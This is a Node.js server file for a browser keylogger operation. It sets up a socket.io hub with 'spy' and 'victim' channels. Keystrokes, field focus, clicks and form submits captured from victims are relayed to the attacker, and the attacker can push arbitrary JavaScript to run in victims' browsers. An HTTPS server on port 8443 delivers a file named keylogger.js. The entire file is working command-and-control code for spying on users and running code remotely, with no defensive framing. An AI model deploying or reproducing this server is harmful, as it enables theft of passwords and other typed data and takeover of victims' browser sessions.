const express = require('express');
const http = require('http');
var https = require('https');
var fs = require('fs');
const path = require('path');

const app = express();

const { Server } = require("socket.io");

const socketServer = http.createServer(app);
const io = new Server(socketServer);

app.use("/", express.static(path.join(__dirname, 'public')));

const spy = io
    .of('/spy')
    .on('connection', function (socket) {
        console.log('Attacker connected.');
        socket.on('eval', function (js) {
            console.log('Remote JS:', js);
            victim.emit('eval', js);
        });

        socket.on('disconnect', function () {
            console.log('Attacker disconnected.');
        });
    });

const victim = io
    .of('/victim')
    .on('connection', function (socket) {
        console.log('Victim connected');

        socket.on('type', function (key) {
            console.log('victim/type:', key);
            spy.emit('type', key);
        });

        socket.on('focus', function (focus) {
            console.log('victim/focus:', focus);
            spy.emit('focus', focus);
        });

        socket.on('click', function (click) {
            console.log('victim/click:', click);
            spy.emit('submit', click);
        });

        socket.on('submit', function (submit) {
            console.log('victim/submit:', submit);
            spy.emit('submit', submit);
        });


        socket.on('disconnect', function () {
            console.log('Victim disconnected');
        });
    });


var privateKey = fs.readFileSync(__dirname + '/../certs/server.key', 'utf8');
var certificate = fs.readFileSync(__dirname + '/../certs/server.crt', 'utf8');

var encryption = {
    key: privateKey,
    cert: certificate
};

https.createServer(encryption, (req, res) => {
    fs.readFile(__dirname + '/delivery/keylogger.js', function (err, data) {
        if (err) {
            res.writeHead(404);
            res.end(JSON.stringify(err));
            return;
        }
        res.writeHead(200);
        res.end(data);
    });
}).listen(8443, () => {
    console.log('Delivery server: https://0.0.0.0:8443/keylogger.js.');
});

socketServer.listen(3000, () => {
    console.log('WebSocket server listen on ws://0.0.0.0:3000');
});
